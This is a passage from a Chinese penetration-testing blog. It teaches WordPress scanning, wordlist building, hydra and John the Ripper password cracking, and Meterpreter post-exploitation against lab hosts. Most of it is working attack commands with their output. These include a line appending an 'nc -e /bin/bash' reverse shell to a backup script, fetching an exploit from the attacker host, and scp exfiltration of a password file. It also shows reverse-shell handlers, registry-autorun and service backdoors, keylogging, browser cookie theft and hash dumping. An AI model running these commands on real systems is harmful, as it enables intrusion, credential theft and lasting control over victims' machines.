<p><strong>该扫描器可以实现获取站点用户名，获取安装的所有插件、主题，以及存在漏洞的插件、主题，并提供漏洞信息。同时还可以实现对未加防护的<code>Wordpress</code>站点暴力破解用户名密码</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -e vp #  u  #扫描存在用户</span></span><br><span class="line">root@kali:~<span class="comment"># wpscan --url http://dc-2 -U users.txt -P passwd.txt #破解用户密码</span></span><br><span class="line">wpscan -<span class="literal">-url</span> http://dc<span class="literal">-2</span> <span class="literal">-e</span> vp <span class="comment">#只枚举有漏洞的插件</span></span><br><span class="line">wpscan -<span class="literal">-url</span> http://dc<span class="literal">-2</span> <span class="literal">-e</span> vt <span class="comment">#扫描主题中存在的漏洞</span></span><br></pre></td></tr></table></figure>

<p>防御手段：</p>
<ul>
<li>使用<code>Block Bad Queries (BBQ)</code>插件，就可以屏蔽和禁止这类扫描（<strong>防范扫描插件、主题、TimThumb文件</strong>)</li>
<li>防止暴力破解的最好方式是限制一个<code>IP</code>地址的尝试登录次数</li>
</ul>
<p><strong>密码本制作–cewl</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2 # -w 字典存为文件</span></span><br><span class="line">root@kali:~<span class="comment"># cewl -w passwd.txt http://dc-2 -m 8 # -m 密码长度至少8位数</span></span><br><span class="line">cewl <span class="literal">-w</span> passwd.txt http://dc<span class="literal">-2</span> <span class="literal">-d</span> <span class="number">3</span> <span class="comment"># -d 增加深度获取更大的字典文件，默认为2</span></span><br></pre></td></tr></table></figure>

<h4 id="4-2-密码爆破"><a href="#4-2-密码爆破" class="headerlink" title="4.2.密码爆破"></a><strong>4.2.密码爆破</strong></h4><p>hydra是著名黑客组织thc的一款开源的暴力密码破解工具，可以在线破解多种密码，但是如果目标网站登录时候需要验证码就无法破解了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-f 一对密码破解后终止 -vV详细过程 ，以post方式提交</span></span><br><span class="line">hydra <span class="literal">-l</span> admin <span class="literal">-P</span> ./rockyou.txt  <span class="operator">-f</span> <span class="number">192.168</span>.<span class="number">17.130</span>  http<span class="literal">-post</span><span class="literal">-form</span>   <span class="string">"/login.php:username=^USER^&amp;password=^PASS^:S=logout"</span> <span class="literal">-vV</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-L 用户名字典  -t 64 表示线程数 ssh破解</span></span><br><span class="line">hydra <span class="literal">-L</span> users.txt <span class="literal">-P</span> pswd.txt ssh://<span class="number">192.168</span>.<span class="number">126.149</span> <span class="literal">-t</span> <span class="number">64</span> <span class="operator">-f</span> <span class="literal">-v</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#以get方式提交</span></span><br><span class="line">hydra <span class="literal">-L</span> users.txt <span class="literal">-P</span> pswd.txt  <span class="operator">-f</span> <span class="number">192.168</span>.<span class="number">17.130</span>  http<span class="literal">-get</span> /admin/index.php</span><br><span class="line"></span><br><span class="line"><span class="comment">#破解https </span></span><br><span class="line">hydra <span class="literal">-m</span> /index.php <span class="literal">-l</span> muts <span class="literal">-P</span> pass.txt <span class="number">10.36</span>.<span class="number">16.18</span> https</span><br></pre></td></tr></table></figure>

<p>John the Ripper是一个快速的密码破解工具，用于在已知密文的情况下尝试破解出明文，支持目前大多数的加密算法，如DES、MD4、MD5等</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加密码本，后面是待破解的，需要花费的时间比较久</span></span><br><span class="line">john -<span class="literal">-wordlist</span>=/usr/share/wordlists/rockyou.txt hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#john工具对于同一个shadow文件只会进行一次爆破，如果第二次执行john shadow是不会得到结果的</span></span><br><span class="line">john -<span class="literal">-show</span> password <span class="comment">#用此查看上一次爆破结果</span></span><br><span class="line">-<span class="literal">-format</span>=DES/MD5...  <span class="comment">#指定密文格式</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#快速时别hash加密方式</span></span><br><span class="line">hashid xxx</span><br></pre></td></tr></table></figure>

<h3 id="5-内网渗透技巧"><a href="#5-内网渗透技巧" class="headerlink" title="5.内网渗透技巧"></a><strong>5.内网渗透技巧</strong></h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将靶机本地文件，发送到主机上</span></span><br><span class="line">scp ./old<span class="literal">-passwords</span>.bak root@<span class="number">192.168</span>.<span class="number">126.33</span>:/root/tools</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载主机文件到靶机上</span></span><br><span class="line">攻击机：python <span class="literal">-m</span> SimpleHTTPServer <span class="number">8000</span></span><br><span class="line">靶机：wget http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">8000</span>/exploit.tar </span><br><span class="line"></span><br><span class="line"><span class="comment">#写入脚本到文件中</span></span><br><span class="line">echo <span class="string">"nc -e /bin/bash 192.168.126.33 2222"</span> &gt;&gt; backups.sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#交互显示</span></span><br><span class="line">python <span class="literal">-c</span> <span class="string">"import pty;pty.spawn('/bin/bash')"</span></span><br></pre></td></tr></table></figure>


      
      <!-- reward -->
      
    </div>
    
    
      <!-- copyright -->
      
    <footer class="article-footer">
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" rel="tag">渗透工具</a></li></ul>


    </footer>

  </div>

  

  
  
  

  

</article>
    
    <article id="post-Metasploit" class="article article-type-post" itemscope
  itemprop="blogPost" data-scroll-reveal>

  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2020/09/11/Metasploit/"
    >Metasploit</a
  >
</h2>
  

    </header>
    

    
    <div class="article-meta">
      <a href="/2020/09/11/Metasploit/" class="article-date">
  <time datetime="2020-09-11T10:55:45.000Z" itemprop="datePublished">2020-09-11</time>
</a>
      
      
      
      
    </div>
    

    

    
    <div class="article-entry" itemprop="articleBody">
      


      

      
      <p>主要介绍下Meterpreter攻击载荷模块</p>
<h2 id="1-常用命令"><a href="#1-常用命令" class="headerlink" title="1.常用命令"></a><strong>1.常用命令</strong></h2><table>
<thead>
<tr>
<th align="center"><strong>background</strong></th>
<th align="center"><strong>将meterpreter隐藏在后台</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>sessions</strong></td>
<td align="center"><strong>查看已经成功获取的会话</strong></td>
</tr>
<tr>
<td align="center"><strong>quit</strong></td>
<td align="center"><strong>关闭meterpreter会话返回msf</strong></td>
</tr>
</tbody></table>
<p><strong><img src="/2020/09/11/Metasploit/1.png" alt></strong></p>
<h3 id="1-1文件系统命令"><a href="#1-1文件系统命令" class="headerlink" title="1.1文件系统命令"></a><strong>1.1文件系统命令</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>getwd</strong></th>
<th align="center"><strong>目标机当前的工作目录</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>getlwd</strong></td>
<td align="center"><strong>当前系统的工作目录</strong></td>
</tr>
<tr>
<td align="center"><strong>upload</strong></td>
<td align="center"><strong>上传文件到目标机器</strong></td>
</tr>
<tr>
<td align="center"><strong>download</strong></td>
<td align="center"><strong>从目标机器上下载文件（注意路径符号）</strong></td>
</tr>
<tr>
<td align="center"><strong>edit</strong></td>
<td align="center"><strong>调用vi对目标机的文件进行编辑</strong></td>
</tr>
<tr>
<td align="center"><strong>search  -h</strong></td>
<td align="center"><strong>文件搜索</strong></td>
</tr>
</tbody></table>
<p><img src="/2020/09/11/Metasploit/2.png" alt></p>
<h3 id="1-2-网络命令"><a href="#1-2-网络命令" class="headerlink" title="1.2 网络命令"></a><strong>1.2 网络命令</strong></h3><p><strong>portfwd是端口转发命令，假设3389只允许内网访问，可用此命令进行端口转发，从而能直接访问目标主机</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName=<span class="string">'%COMPUTERNAME%'</span> call SetAllowTSConnections <span class="number">1</span>  <span class="comment">#开启3389</span></span><br><span class="line">portfwd add <span class="literal">-l</span> <span class="number">1234</span> <span class="literal">-p</span> <span class="number">3389</span> <span class="literal">-r</span> <span class="number">192.168</span>.xx.xx</span><br><span class="line">root@kali:~/tools<span class="comment"># rdesktop -u admin -p 1234 127.0.0.1:1234</span></span><br><span class="line">route <span class="comment">#显示主机路由信息</span></span><br></pre></td></tr></table></figure>

<h3 id="1-3-系统命令"><a href="#1-3-系统命令" class="headerlink" title="1.3 系统命令"></a><strong>1.3 系统命令</strong></h3><table>
<thead>
<tr>
<th align="center"><strong>ps</strong></th>
<th align="left"><strong>显示目标主机上的进程</strong></th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>migrate    304</strong></td>
<td align="left"><strong>可以将meterpreter会话从一个进程移植到另一个进程的内存空间（避免用户关闭进程终止会话连接，可以将进程移植到稳定的系统服务进程中，不需要断开已有的tcp连接） 这里的304是指进程的pid</strong></td>
</tr>
<tr>
<td align="center"><strong>getpid</strong></td>
<td align="left"><strong>获取当前会话所在进程的PID值</strong></td>
</tr>
<tr>
<td align="center"><strong>getuid</strong></td>
<td align="left"><strong>查看当前具有的权限</strong></td>
</tr>
<tr>
<td align="center"><strong>kill 1840</strong></td>
<td align="left"><strong>结束目标进程</strong></td>
</tr>
<tr>
<td align="center"><strong>sysinfo</strong></td>
<td align="left"><strong>查看目标系统信息</strong></td>
</tr>
<tr>
<td align="center"><strong>shutdown</strong></td>
<td align="left"><strong>关闭目标主机</strong></td>
</tr>
</tbody></table>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -H -f cmd.exe  #隐藏执行cmd.exe程序</span><br><span class="line">Process 2076 created.</span><br><span class="line">meterpreter &gt; execute -H -i -f   cmd.exe   #进行交互    </span><br><span class="line">Process 2740 created.                          </span><br><span class="line">Channel 1 created.                                                                     </span><br><span class="line">C:\&gt;whoami                                     </span><br><span class="line">execute -H -m -d normal.exe -f wce.exe -a "-o foo.txt" #wce.exe是攻击机上的可执行文件，后面是参数</span><br><span class="line"><span class="meta">#</span><span class="bash">-H 表示隐藏执行，-d 表示伪装在目标机器上的进程，-m支持直接从内存中执行攻击端的文件</span></span><br></pre></td></tr></table></figure>

<h2 id="2-后渗透攻击模块"><a href="#2-后渗透攻击模块" class="headerlink" title="2.后渗透攻击模块"></a><strong>2.后渗透攻击模块</strong></h2><p>主要步骤如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http                                                                                                                               </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line">lhost =&gt; <span class="number">192.168</span>.<span class="number">126.33</span>                                                                                                                                                   </span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport <span class="number">1234</span>                                                                                                                              </span><br><span class="line">lport =&gt; <span class="number">1234</span>                                                                                                                                                             </span><br><span class="line">msf5 exploit(multi/handler) &gt; run                                                                                                                                                                                                                                                                                                                 </span><br><span class="line">[*] Started HTTP reverse handler on http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span>                                                                                                            </span><br><span class="line">[*] http://<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> handling request from <span class="number">192.168</span>.<span class="number">126.151</span>; (UUID: fop9sg                                                                                       hd) Staging x86 payload (<span class="number">181337</span> bytes) ...                                                                                                                                </span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="number">192.168</span>.<span class="number">126.33</span>:<span class="number">1234</span> -&gt; <span class="number">192.168</span>.<span class="number">126.151</span>:<span class="number">1087</span>) at <span class="number">2</span>                                                                                       <span class="number">020</span><span class="literal">-09</span><span class="literal">-12</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">29</span> +<span class="number">0800</span>                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                          </span><br><span class="line">meterpreter &gt; arp<span class="literal">-a</span></span><br></pre></td></tr></table></figure>



<p>通过Persistence与metsvc等后渗透攻击模块，在目标主机上安装自启动和永久服务的方式，可以长久的控制目标主机！</p>
<h3 id="2-1-persistence后渗透攻击模块"><a href="#2-1-persistence后渗透攻击模块" class="headerlink" title="2.1 persistence后渗透攻击模块"></a><strong>2.1 persistence后渗透攻击模块</strong></h3><p>运行后，会在目标主机的注册表键中添加键值，达到自启动的目的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run persistence <span class="literal">-X</span> <span class="literal">-i</span> <span class="number">5</span> <span class="literal">-p</span> <span class="number">443</span> <span class="literal">-r</span> <span class="number">192.168</span>.<span class="number">126.33</span></span><br><span class="line"><span class="comment">#-X 表示开机自启动，-i表示反向连接的间隔时间</span></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Running Persistence Script</span><br><span class="line">[*] Resource file <span class="keyword">for</span> cleanup created at /root/.msf4/logs/persistence/STU1_20200912.<span class="number">0938</span>/STU1_20200912.<span class="number">0938</span>.rc</span><br><span class="line">[*] Creating Payload=windows/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span>.<span class="number">126.33</span> LPORT=<span class="number">443</span></span><br><span class="line">[*] Persistent agent script is <span class="number">99613</span> bytes long</span><br><span class="line">[+] Persistent Script written to C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[*] Executing script C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\jveynIXzUsxp.vbs</span><br><span class="line">[+] Agent executed with PID <span class="number">1832</span></span><br><span class="line">[*] Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br><span class="line">[+] Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\AcgmcGcp</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.126.33</span><br><span class="line">lhost =&gt; 192.168.126.33</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lport 443</span><br><span class="line">lport =&gt; 443</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.126.33:443 </span><br><span class="line">[*] Sending stage (180291 bytes) to 192.168.126.151</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.126.33:443 -&gt; 192.168.126.151:1440) at 2020-09-12 16:49:24 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sysinfo </span><br><span class="line">Computer        : STU1</span><br><span class="line">OS              : Windows 7 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : GOD</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>

<h3 id="2-2-metsvc后渗透攻击模块"><a href="#2-2-metsvc后渗透攻击模块" class="headerlink" title="2.2 metsvc后渗透攻击模块"></a><strong>2.2 metsvc后渗透攻击模块</strong></h3><p>主要是在目标主机的31337端口开启后门监听服务，并上传3个meterpreter模块</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run metsvc </span><br><span class="line"></span><br><span class="line">[!] Meterpreter scripts are deprecated. <span class="keyword">Try</span> exploit/windows/local/persistence.</span><br><span class="line">[!] Example: run exploit/windows/local/persistence OPTION=value [<span class="type">...</span>]</span><br><span class="line">[*] Creating a meterpreter service on port <span class="number">31337</span></span><br><span class="line">[*] Creating a temporary installation directory C:\Users\ADMINI~<span class="number">1</span>\AppData\Local\Temp\dpcuvwyl...</span><br><span class="line">[*]  &gt;&gt; Uploading metsrv.x86.dll...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc<span class="literal">-server</span>.exe...</span><br><span class="line">[*]  &gt;&gt; Uploading metsvc.exe...</span><br><span class="line">[*] Starting the service...</span><br><span class="line">         * Installing service metsvc</span><br><span class="line"> * Starting service</span><br><span class="line">Service metsvc successfully installed.</span><br></pre></td></tr></table></figure>

<p>以上两个模块都容易被杀毒软件检测到，实用性不强，可上传免杀处理后的远程控制工具。</p>
<h3 id="2-3-权限提升"><a href="#2-3-权限提升" class="headerlink" title="2.3 权限提升"></a><strong>2.3 权限提升</strong></h3><p>getsysytem  命令集成了四种权限提升技术</p>
<p>分别利用了MS09-012和MS10-015、MS10-073、MS10-092中的漏洞 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/usr/share/metasploit-framework/modules/post/windows/escalate# ls</span><br><span class="line">droplnk.rb  getsystem.rb  golden_ticket.rb  ms10_073_kbdlayout.rb  screen_unlock.rb  unmarshal_cmd_exec.rb</span><br></pre></td></tr></table></figure>



<h3 id="2-4-信息获取"><a href="#2-4-信息获取" class="headerlink" title="2.4 信息获取"></a><strong>2.4 信息获取</strong></h3><p><strong>dumplink模块：获取目标主机最近的系统操作、访问文件和office文档的操作记录</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/dumplinks </span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Running as SYSTEM extracting user list...</span><br><span class="line">[*] Extracting lnk files <span class="keyword">for</span> user Administrator at C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\...</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\<span class="number">01</span>.靶场夺旗第一关.pdf.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\Chapter_1L.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\lab.txt.lnk.</span><br><span class="line">[*] Processing: C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\malware.lnk.</span><br></pre></td></tr></table></figure>



<p><strong>enum_applications模块：获取目标主机安装的软件、安全更新与漏洞补丁的信息</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_applications </span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on STU1</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">======================</span><br><span class="line"></span><br><span class="line"> Name                                                            Version</span><br><span class="line"> ----                                                            -------</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2008 Redistributable - x86 9.0.30729.4148  9.0.30729.4148</span><br><span class="line"> Microsoft Visual C++ 2017 X86 Minimum Runtime - 14.16.27033     14.16.27033</span><br><span class="line"> Mozilla Firefox 69.0.1 (x86 zh-CN)                              69.0.1</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Nmap 7.80                                                       7.80</span><br><span class="line"> Notepad++ (32-bit x86)                                          7.7.1</span><br><span class="line"> Npcap 0.9983                                                    0.9983</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> WinPcap 4.1.3                                                   4.1.0.2980</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"> Wireshark 3.0.4 32-bit                                          3.0.4</span><br><span class="line"></span><br><span class="line">[+] Results stored in: /root/.msf4/loot/20200912201743_default_192.168.126.151_host.application_539875.txt</span><br></pre></td></tr></table></figure>

<p><strong>获取键盘记录，从start开始记录</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start </span><br><span class="line">Starting the keystroke sniffer ...</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">Dumping captured keystrokes...</span><br><span class="line">&lt;Left Windows&gt;ist mimi&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">meterpreter &gt; keyscan_stop </span><br><span class="line">Stopping the keystroke sniffer...</span><br></pre></td></tr></table></figure>



<h3 id="2-5-口令获取和利用"><a href="#2-5-口令获取和利用" class="headerlink" title="2.5 口令获取和利用"></a><strong>2.5 口令获取和利用</strong></h3><p><strong>通过网络嗅探获取，在post/windows/gather/credentials目录下有许多这一块的攻击模块</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; use sniffer </span><br><span class="line">Loading extension sniffer...Success.</span><br><span class="line">meterpreter &gt; sniffer_interfaces <span class="comment">#获取网卡</span></span><br><span class="line"><span class="number">1</span> - <span class="string">'WAN Miniport (Network Monitor)'</span> ( type:<span class="number">3</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"><span class="number">2</span> - <span class="string">'Intel(R) PRO/1000 MT Network Connection'</span> ( type:<span class="number">0</span> mtu:<span class="number">1514</span> usable:true dhcp:false wifi:false )</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_start <span class="number">1</span></span><br><span class="line">[*] Capture started on interface <span class="number">1</span> (<span class="number">50000</span> packet buffer)</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_dump <span class="number">1</span> /root/xp1.cap <span class="comment">#保存在本地，再用wireshark分析</span></span><br><span class="line">[*] Flushing packet capture buffer <span class="keyword">for</span> interface <span class="number">1</span>...</span><br><span class="line">[*] Flushed <span class="number">0</span> packets (<span class="number">0</span> bytes)</span><br><span class="line">[*] Download completed, converting to PCAP...</span><br><span class="line">[*] PCAP file written to /root/xp1.cap</span><br><span class="line"></span><br><span class="line">meterpreter &gt; sniffer_stop <span class="number">1</span></span><br><span class="line">[*] Capture stopped on interface <span class="number">1</span></span><br><span class="line">[*] There are <span class="number">0</span> packets (<span class="number">0</span> bytes) remaining</span><br><span class="line">[*] Download or release them <span class="keyword">using</span> <span class="string">'sniffer_dump'</span> or <span class="string">'sniffer_release'</span></span><br></pre></td></tr></table></figure>

<p><strong>通过浏览器获取关键信息，如cookie、历史记录、密码等</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_ie </span><br><span class="line"></span><br><span class="line">[*] IE Version: <span class="number">8.0</span>.<span class="number">7601.17514</span></span><br><span class="line">[*] Retrieving history.....</span><br><span class="line">        File: C:\Users\Administrator\AppData\Local\Microsoft\Windows\History\History.IE5\index.dat</span><br><span class="line">        File: </span><br><span class="line">[*] Looping through history to find autocomplete data....</span><br><span class="line">[-] No autocomplete entries found <span class="keyword">in</span> registry</span><br><span class="line">[*] Looking <span class="keyword">in</span> the Credential Store <span class="keyword">for</span> HTTP Authentication Creds...</span><br><span class="line">[*] Writing history to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.history_734619.txt</span><br><span class="line">[*] Writing cookies to loot...</span><br><span class="line">[+] <span class="keyword">Data</span> saved <span class="keyword">in</span>: /root/.msf4/loot/<span class="number">20200912205807</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_ie.cookies_282520.txt</span><br></pre></td></tr></table></figure>



<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run windows/gather/smart_hashdump  <span class="comment">#获取系统口令的哈希值</span></span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database <span class="keyword">if</span> one is connected.</span><br><span class="line">[+] Hashes will be saved <span class="keyword">in</span> loot <span class="keyword">in</span> JtR password file format to:</span><br><span class="line">[*] /root/.msf4/loot/<span class="number">20200912210516</span>_default_192.<span class="number">168.126</span>.<span class="number">151</span>_windows.hashes_975340.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*]     Obtaining the boot key...</span><br><span class="line">[*]     Calculating the hboot key <span class="keyword">using</span> SYSKEY 